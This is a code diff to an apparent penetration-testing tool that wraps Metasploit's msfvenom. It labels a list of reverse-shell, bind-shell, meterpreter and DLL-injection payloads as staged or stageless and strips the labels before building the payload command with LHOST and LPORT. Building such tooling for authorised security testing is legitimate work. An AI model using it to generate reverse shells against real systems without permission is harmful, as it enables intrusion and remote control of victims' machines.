@@ -48,25 +48,27 @@ SALT_MAGIC = b"PFSL"     # key-derivation salt header
 
 MSF_PAYLOADS = [
     # Windows
-    "windows/meterpreter/reverse_tcp",
-    "windows/x64/meterpreter/reverse_tcp",
-    "windows/meterpreter/reverse_https",
-    "windows/x64/meterpreter/reverse_https",
-    "windows/x64/shell_reverse_tcp",
-    "windows/x64/exec",
-    "windows/dllinject/reverse_tcp",
+    "windows/meterpreter/reverse_tcp [staged]",
+    "windows/x64/meterpreter/reverse_tcp [staged]",
+    "windows/meterpreter/reverse_https [staged]",
+    "windows/x64/meterpreter/reverse_https [staged]",
+    "windows/x64/shell_reverse_tcp [stageless]",
+    "windows/shell_reverse_tcp [stageless]",
+    "windows/shell/reverse_tcp [staged]",
+    "windows/x64/exec [staged]",
+    "windows/dllinject/reverse_tcp [staged]",
     # Linux
-    "linux/x64/meterpreter/reverse_tcp",
-    "linux/x64/meterpreter/reverse_https",
-    "linux/x64/shell_reverse_tcp",
-    "linux/x64/shell_bind_tcp",
-    "linux/x86/meterpreter/reverse_tcp",
-    "linux/x64/shell_find_flag",
+    "linux/x64/meterpreter/reverse_tcp [staged]",
+    "linux/x64/meterpreter/reverse_https [staged]",
+    "linux/x64/shell_reverse_tcp [stageless]",
+    "linux/x64/shell_bind_tcp [stageless]",
+    "linux/x86/meterpreter/reverse_tcp [staged]",
+    "linux/x64/shell_find_flag [stageless]",
     # macOS
-    "osx/x64/shell_reverse_tcp",
-    "osx/x64/meterpreter/reverse_tcp",
-    "osx/arm64/shell_reverse_tcp",
-    "osx/x64/shell_bind_tcp",
+    "osx/x64/shell_reverse_tcp [stageless]",
+    "osx/x64/meterpreter/reverse_tcp [staged]",
+    "osx/arm64/shell_reverse_tcp [stageless]",
+    "osx/x64/shell_bind_tcp [stageless]",
 ]
 
 MSF_FORMATS = {
@@ -729,7 +731,9 @@ class Forge:
             raise ForgeError("msfvenom not found on PATH (Kali: `sudo apt install metasploit-framework`)")
         fmt = cfg.get("fmt") or "raw"
         out = os.path.join(outdir, "payload." + safe_name(fmt))
-        cmd = [exe, "-p", cfg["payload"], "-f", fmt, "-o", out]
+        # strip the GUI's [staged]/[stageless] annotation — msfvenom wants the bare name
+        payload_name = cfg["payload"].split(" [")[0].strip()
+        cmd = [exe, "-p", payload_name, "-f", fmt, "-o", out]
         if cfg.get("lhost"):
             cmd += [f"LHOST={cfg['lhost']}"]
         if cfg.get("lport"):
